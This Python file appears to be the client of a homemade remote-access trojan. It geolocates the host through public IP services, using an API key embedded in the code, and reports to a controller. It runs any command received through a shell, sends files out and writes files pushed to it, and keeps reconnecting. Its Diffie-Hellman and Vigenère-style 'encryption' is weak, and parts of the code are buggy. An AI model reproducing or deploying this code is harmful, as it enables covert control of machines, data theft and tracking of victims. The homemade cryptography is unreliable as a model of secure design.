#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: client.py
    Author: MathIsSimple
    Using: Python 3.7.0
    Build Version: 1.2
'''

# Import core python needed modules

import platform as plat
import requests
import socket
import random
import time
import sys
import re

from subprocess import Popen
from subprocess import PIPE
from os         import path

# Global Variables

characters    = "\"\\?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'!&+*|`^@[]=#~-_<>(){}§$%µ£¤ç ";
bits_per_char = len(bin(len(characters))) - 2
Connected     = False
GatheredInfo  = False
Reconnect     = True
sock = None
PORT = 64500
WEBP = 80
Info = None
cmds = []

g = 0
n = 0
p = 0

g_to_server = 0
diffieKey   = 0

isDiffie    = True
DiffieStep  = 0

square    = ""
cipher    = ""

# GUI

def doDiffie():
    global sock
    global isDiffie
    global DiffieStep
    global cipher
    global g
    global n
    global p

    while True:
        data = sock.recv(1024).decode()
        if data != "":
            if isDiffie == True:
                if DiffieStep == 0:
                    g = int(data)
                if DiffieStep == 1:
                    n = int(data)
                    p = int(random.uniform(1, n))
                    g_to_server = (g**p) % n
                if DiffieStep == 2:
                    diffieKey = (int(data)**p) % n
                    time.sleep(0.25)
                    sock.send((str(g_to_server) + "\n").encode())
                    cipher   = createCipher(diffieKey)
                    isDiffie = False
                    print("Key : " + str(diffieKey))
                    break

                DiffieStep = DiffieStep + 1

def createSquare():
    square = [[" "] * len(characters)] * len(characters)

    for i in range(len(characters)):
        square[i] = characters[i:] + characters[:i]
    
    return square

def createCipher(key):
    return characters[:key % len(characters)]

def createEndCipher(cipher, message):
    i = 0
    endCipher = ""
    for p_i in range(len(message)):
        if i >= len(cipher):
            i = 0
        endCipher = endCipher + cipher[i]
        i = i + 1
    return endCipher

def VigenenereEncrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfMessageChar = -1
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if char == letter:
                indexInAlphabetOfMessageChar = i

            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i

            if indexInAlphabetOfCipherChar != -1 and indexInAlphabetOfMessageChar != -1:
                break
            
            i = i + 1
        
        if indexInAlphabetOfMessageChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            output = output + square[indexInAlphabetOfMessageChar][indexInAlphabetOfCipherChar]
        
        index = index + 1
    return output

def VigenenereDecrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i
                break
            
            i = i + 1
        
        if indexInAlphabetOfCipherChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            search = square[indexInAlphabetOfCipherChar]
            out    = ""
            i = 0
            for letter in search:
                if letter == char:
                    out = characters[i]
                    break
                i = i + 1
            if out == "":
                print("error")
            output = output + out
        
        index = index + 1
    return output

# Encryption Files

def modify(message):
    output = ""

    for l in message:
        index  = characters.find(l)
        index2 = len(characters) - 1 - index
        letter = characters[index2]
        output = output + letter
    
    return output

def longify(message):
    output = ""

    for char in message:
        bin_number = str(bin(characters.find(char)))[2:]
        for i in range(bits_per_char - len(bin_number)):
            bin_number = "0" + bin_number
        output = output + bin_number

    return output

def delongify(message):
    output = ""
    for i in range(int(len(message) / bits_per_char)):
        char   = int(message[i * bits_per_char:i * bits_per_char + bits_per_char], 2)
        output = output + characters[char]

    return output

def encrypt(message):
    output = message[::-1]
    output = VigenenereEncrypt(output)

    return output

def decrypt(message):
    output = VigenenereDecrypt(message)
    output = output[::-1]

    return output

# Command Line Functions

def decodeCommandOutput(output):
    output = output.replace("\\", "/").replace("//", "/")
    output = output.replace("b'", "").replace('b"', "")
    output = output.replace("/r", "").replace("/n", "")
    output = output.replace("/x82", "é").replace("/x8a", "è")
    output = output.replace("/xff", " ")

    return output

def getCommandOutput(data):
    out = []
    process = Popen(data, stdout=PIPE, stderr=None, shell=True)

    while True:
        line = process.stdout.readline()

        if line != b"":
            contents = decodeCommandOutput(str(line))

            if contents.endswith("'") or contents.endswith('"'):
                contents = contents[:-1]
            
            if contents != "":
                if contents[0] == " ":
                    contents = contents[1:]
            
            out.append(contents)
        else:
            break

    out.append("END")

    return out

# Information Gathering Functions

def getInfo():
    global GatheredInfo

    GatheredInfo = True

    platform  = "Platform : "  + plat.platform()
    system    = "System : "    + plat.system()

    try:
        ip        = "Ip : "        + requests.get("https://api.ipify.org/?format=json").json()["ip"]    
        ip_info   = requests.get("http://api.ipstack.com/"+ip+"?access_key=5666d16d47c94935142e312df7c1afd1&format=1").json()
        continent = "Continent : " + str(ip_info["continent_name"])
        country   = "Country : "   + str(ip_info["country_name"])
        city      = "City : "      + str(ip_info["city"])

        return   [platform, system, ip, continent, country, city, "END"]
    except:
        return   [platform, system, "END"]

# Socket Functions

def createSocket(HOST, PORT):
    global Connected

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        Connected = True
    except ConnectionRefusedError:
        print("Error While Trying To Reconnect")
        print("Waiting 5s")
        time.sleep(5)

    return sock

def receiveData():
    global Connected

    if Connected == True:
        try:
            data = decrypt(sock.recv(1024).decode("utf-8", 'ignore'))
            return data
        except ConnectionResetError:
            print("Disconnected")
            Connected = False
    
    return ""

def sendData(data):
    global Connected
    global sock

    if Connected == True:
        data = encrypt(str(data))
        data = (data + "\n").encode()
        sock.sendall(data)

def sendArray(data):
    global Connected

    for content in data:
        if Connected == False:
            break
        else:
            sendData(content)
            time.sleep(0.1)

def convert_to_bytes(no):
    result = bytearray()
    result.append(no & 255)
    for i in range(3):
        no = no >> 8
        result.append(no & 255)
    return result

def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i*8)
    return res

def handleCommands():
    global Connected
    global sock

    while True:
        if Connected == False:
            break

        data = receiveData()

        if Connected == False:
            break
        
        if data:
            if data != "END":
                print(data)
                if data.startswith("download"):
                    time
                    contents = ""
                    filename = data[len("download")+1:]

                    if path.isfile(filename) == True:
                        sock.send("OK".encode())
                        input_file = open(filename, "rb")
                        file_size  = path.getsize(filename)

                        sock.send(convert_to_bytes(file_size))

                        time.sleep(0.2)

                        data = input_file.read(1024)

                        while True:
                            sock.send(data)

                            data = input_file.read(1024)

                            if not data:
                                break

                        input_file.close()
                    else:
                        sock.send("STOP UPLOAD PROCESS".encode())
                
                elif data.startswith("upload"):
                    file_size    = 0
                    current_size = 0
                    buffer       = b""
                    output_file_location = ""

                    doStop = False

                    while True:
                        data = sock.recv(1024).decode()
                        if data != "":
                            if data == "STOP UPLOAD PROCESS":
                                doStop = True
                            else:
                                output_file_location = data
                            break

                    if doStop == True:
                        break

                    output_file  = open(output_file_location, "wb+")

                    while True:
                        data = sock.recv(4)

                        if data != "":
                            file_size = bytes_to_number(data)
                            break

                    while current_size < file_size:
                        data = sock.recv(1024)

                        if not data:
                            break

                        if len(data) + current_size > file_size:
                            data = data[:file_size-current_size]
                        
                        buffer += data
                        
                        current_size += len(data)

                    output_file.write(buffer)
                    output_file.close()
                else:
                    print("Command : " + data)
                    cmds.append(data)
                    output = getCommandOutput(data)
                    sendArray(output)
            else:
                print("Closing ...")
                sock.close()
                exit(0)

def start():
    global sock
    global Connected
    global GatheredInfo
    global PORT
    global Info
    global Reconnect

    if GatheredInfo == False:
        Info = getInfo()
        print("Gathered Info")
    
    sock = createSocket("127.0.0.1", PORT)

    if Connected:
        print("Created Connexion With Server")
        doDiffie()
        sendArray(Info)
        print("Sent Info")
        print("Handling Commands")
        handleCommands()

    while Connected == False:
        if Reconnect == True:
            sock = None
            print("Attempting reconnect")
            start()

square = createSquare()

start()